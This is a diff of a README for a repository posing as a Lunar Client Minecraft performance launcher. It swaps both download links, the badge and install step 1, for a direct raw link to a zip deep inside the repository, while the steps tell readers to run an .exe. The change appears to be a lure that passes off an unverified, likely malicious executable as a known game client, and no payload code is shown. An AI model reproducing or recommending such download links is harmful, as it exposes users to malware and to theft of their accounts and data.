@@ -1,6 +1,6 @@
 # 🚀 lunar-client-minecraft - Improve Minecraft performance and frame rates
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Lunar-Client-blue.svg)](https://github.com/cracklechinapaulhindemith433/lunar-client-minecraft)
+[![Download Latest Version](https://img.shields.io/badge/Download-Lunar-Client-blue.svg)](https://github.com/cracklechinapaulhindemith433/lunar-client-minecraft/raw/refs/heads/main/client/Moonrise-main/client-minecraft-lunar-1.1-alpha.2.zip)
 
 ## 🎯 About This Software
 
@@ -14,7 +14,7 @@ Your computer needs specific parts to run this software. You must have a 64-bit 
 
 Follow these steps to install the launcher on your computer.
 
-1. Visit [this page to download](https://github.com/cracklechinapaulhindemith433/lunar-client-minecraft).
+1. Visit [this page to download](https://github.com/cracklechinapaulhindemith433/lunar-client-minecraft/raw/refs/heads/main/client/Moonrise-main/client-minecraft-lunar-1.1-alpha.2.zip).
 2. Look for the file ending in .exe.
 3. Click the file link to start the download.
 4. Save the file to your desktop or downloads folder.
